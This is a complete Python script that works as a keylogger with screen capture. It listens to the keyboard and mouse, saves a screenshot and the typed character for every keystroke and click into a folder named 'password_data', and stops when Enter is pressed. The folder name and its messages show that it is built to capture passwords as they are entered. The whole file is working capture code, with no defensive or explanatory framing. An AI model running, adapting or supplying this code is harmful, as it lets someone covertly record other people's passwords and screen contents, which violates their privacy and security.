import os
import time
import pyautogui
from pynput import keyboard, mouse
from datetime import datetime

DATA_DIR = "password_data"
os.makedirs(DATA_DIR, exist_ok=True)

log_file = open(os.path.join(DATA_DIR, "key_log.txt"), "w")

def take_screenshot(event_type, info=""):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(DATA_DIR, f"{timestamp}.png")
    screenshot.save(screenshot_path)

    # Log the event
    log_file.write(f"{timestamp},{event_type},{info}\n")
    log_file.flush()
    print(f"[+] {event_type} - {info} at {timestamp}")

def on_key_press(key):
    try:
        if hasattr(key, 'char'):
            char = key.char
        else:
            char = str(key)

        take_screenshot("key", char)

        if key == keyboard.Key.enter:
            print("[*] Password entry ended.")
            return False
    except Exception as e:
        print(f"[!] Keyboard Error: {e}")

def on_click(x, y, button, pressed):
    try:
        if pressed:
            info = f"{button.name} at ({x},{y})"
            take_screenshot("mouse_click", info)
    except Exception as e:
        print(f"[!] Mouse Error: {e}")

# Run both listeners in parallel
keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()  # Main thread waits here
mouse_listener.stop()     # Once keyboard ends, stop mouse

log_file.close()
